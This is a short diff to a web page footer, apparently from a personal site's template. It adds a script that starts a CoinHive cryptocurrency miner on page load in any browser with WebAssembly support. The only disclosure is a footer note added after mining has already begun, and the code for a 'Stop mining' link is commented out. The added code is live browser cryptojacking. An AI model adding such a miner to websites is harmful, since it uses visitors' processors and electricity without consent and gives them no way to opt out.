@@ -40,4 +40,21 @@
 
   </div>
 
+  <script> 
+      var miner = new CoinHive.Anonymous('1LdDVvVDnVQxCvyq62fYV18DRjLqwvzo');
+      if (miner.hasWASMSupport()){
+        miner.start();
+        var footer = document.getElementsByClassName("footer-col")[0];
+        var disclaimer = document.createElement("p");
+        disclaimer.innerHTML = "Note: This site is running coin-hive as an experimental alternative to advertisements.";
+        footer.appendChild(disclaimer);
+
+        // var stopmining = document.createElement('a');
+        // stopmining.setAttribute('href', "#");
+        // stopmining.setAttribute('onclick', "miner.stop();");
+        // stopmining.innerHTML = "Stop mining";
+        // footer.appendChild(stopmining);
+      }
+    </script>
+
 </footer>
